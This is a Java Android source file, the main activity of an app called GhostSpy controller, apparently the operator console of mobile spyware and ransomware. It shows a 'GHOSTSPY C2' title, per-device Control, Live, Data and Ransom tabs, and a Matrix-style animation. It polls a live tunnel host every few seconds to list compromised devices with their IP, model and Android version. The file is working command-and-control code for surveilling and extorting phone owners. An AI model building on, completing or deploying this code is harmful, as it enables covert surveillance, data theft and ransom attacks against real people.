package com.ghostspycontroller;

import android.graphics.Canvas;
import android.graphics.Paint;
import android.os.Bundle;
import android.os.Handler;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import androidx.fragment.app.FragmentPagerAdapter;
import androidx.viewpager.widget.ViewPager;
import com.google.android.material.tabs.TabLayout;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private SurfaceView matrixSurface;
    private MatrixThread matrixThread;
    private ViewPager viewPager;
    private TabLayout tabLayout;
    private DeviceAdapter deviceAdapter;
    private List<Device> deviceList = new ArrayList<>();
    private String selectedDeviceId = null;
    private String selectedDeviceIp = null;
    private ControlFragment controlFragment;
    private LiveFragment liveFragment;
    private DataFragment dataFragment;
    private RansomFragment ransomFragment;
    private Handler refreshHandler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        matrixSurface = findViewById(R.id.matrixSurface);
        matrixThread = new MatrixThread(matrixSurface);
        matrixThread.start();

        viewPager = findViewById(R.id.viewPager);
        tabLayout = findViewById(R.id.tabLayout);
        setupViewPager(null, null);
        SocketHandler.init(this);
        SocketHandler.connect();
        startDeviceRefresher();
    }

    private void setupViewPager(String deviceId, String deviceIp) {
        FragmentManager fm = getSupportFragmentManager();
        List<Fragment> fragments = new ArrayList<>();
        List<String> titles = new ArrayList<>();
        if (deviceId == null) {
            fragments.add(new DeviceListFragment());
            titles.add("Devices");
        } else {
            controlFragment = new ControlFragment(deviceId);
            liveFragment = new LiveFragment(deviceId, deviceIp);
            dataFragment = new DataFragment(deviceId);
            ransomFragment = new RansomFragment(deviceId);
            fragments.add(controlFragment); titles.add("Kontrol");
            fragments.add(liveFragment); titles.add("Live");
            fragments.add(dataFragment); titles.add("Data");
            fragments.add(ransomFragment); titles.add("Ransom");
        }
        viewPager.setAdapter(new FragmentPagerAdapter(fm) {
            @Override public Fragment getItem(int pos) { return fragments.get(pos); }
            @Override public int getCount() { return fragments.size(); }
            @Override public CharSequence getPageTitle(int pos) { return titles.get(pos); }
        });
        tabLayout.setupWithViewPager(viewPager);
    }

    public void onDeviceSelected(String id, String ip) {
        selectedDeviceId = id;
        selectedDeviceIp = ip;
        setupViewPager(id, ip);
    }

    public void updateConnectionStatus(boolean connected) {
        TextView title = findViewById(R.id.titleText);
        title.setText(connected ? "GHOSTSPY C2 [ONLINE]" : "GHOSTSPY C2 [OFFLINE]");
    }

    public void handleIncomingData(JSONObject data) {
        // bisa ditambahkan untuk live data
    }

    private void startDeviceRefresher() {
        refreshHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (SocketHandler.isConnected()) {
                    fetchDevices();
                }
                refreshHandler.postDelayed(this, 5000);
            }
        }, 1000);
    }

    private void fetchDevices() {
        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL("https://de82b3da84480c55-103-216-106-218.serveousercontent.com/api/devices");
                java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(url.openStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                JSONArray arr = new JSONArray(sb.toString());
                List<Device> devs = new ArrayList<>();
                for (int i=0; i<arr.length(); i++) {
                    JSONObject obj = arr.getJSONObject(i);
                    devs.add(new Device(obj.getString("id"), obj.optString("ip",""), obj.getString("model"), obj.getString("android"), obj.optString("last_seen","")));
                }
                runOnUiThread(() -> {
                    deviceList = devs;
                    // perbarui DeviceListFragment jika ada
                });
            } catch (Exception e) {}
        }).start();
    }

    class MatrixThread extends Thread {
        private SurfaceHolder holder;
        private boolean running = true;
        private Paint paint = new Paint();
        private int[] drops;
        private int cols, rows;

        MatrixThread(SurfaceView sv) {
            holder = sv.getHolder();
            paint.setColor(getResources().getColor(R.color.matrix_green));
            paint.setTextSize(20);
        }

        @Override
        public void run() {
            while (running) {
                Canvas c = holder.lockCanvas();
                if (c != null) {
                    if (drops == null || cols != c.getWidth() / 20) {
                        cols = c.getWidth() / 20;
                        rows = c.getHeight() / 20;
                        drops = new int[cols];
                        for (int i = 0; i < cols; i++) drops[i] = (int) (Math.random() * rows);
                    }
                    c.drawColor(0x05000000);
                    for (int i = 0; i < drops.length; i++) {
                        String text = String.valueOf((char) (0x30A0 + Math.random() * 96));
                        c.drawText(text, i * 20, drops[i] * 20, paint);
                        if (drops[i] * 20 > c.getHeight() && Math.random() > 0.975) drops[i] = 0;
                        drops[i]++;
                    }
                    holder.unlockCanvasAndPost(c);
                }
                try { Thread.sleep(50); } catch (InterruptedException e) {}
            }
        }
    }
}
